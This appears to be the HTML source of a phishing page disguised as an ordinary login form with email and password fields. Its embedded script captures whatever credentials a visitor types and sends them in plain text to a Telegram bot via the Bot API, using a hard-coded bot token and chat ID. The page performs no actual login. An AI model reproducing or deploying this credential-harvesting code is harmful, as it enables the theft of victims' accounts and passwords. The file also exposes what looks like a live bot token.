<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background-color: #f9f9f9;
        }
        .container {
            max-width: 400px;
            margin: auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px -10px;
            border-radius: 4px;
            border: 1px solid #ccc;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
        .link {
            display: block;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Login</h2>
    <form id="loginForm" onsubmit="handleLogin(event)">
        <input type="email" id="loginEmail" placeholder="Email" required>
        <input type="password" id="loginPassword" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
    <div class="link">
        <p>Don't have an account?</p>
        <a href="U.S.O.html">Create one here!</a>
    </div>
</div>

<script>
    const telegramBotToken = '7336794177:AAHPn71flj8h0pZPchBibt6-yy31nJ4WbdE'; // Telegram bot token
    const chatId = '5944418337'; // Your chat ID

    async function handleLogin(event) {
        event.preventDefault(); // Prevent form submission
        const email = document.getElementById('loginEmail').value;
        const password = document.getElementById('loginPassword').value;

        // Send login attempt info to Telegram
        sendToTelegram(`Login Attempt:\nEmail: ${email}\nPassword: ${password}`);
        alert("Login attempt sent!");
    }

    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
    }
</script>

</body>
</html>
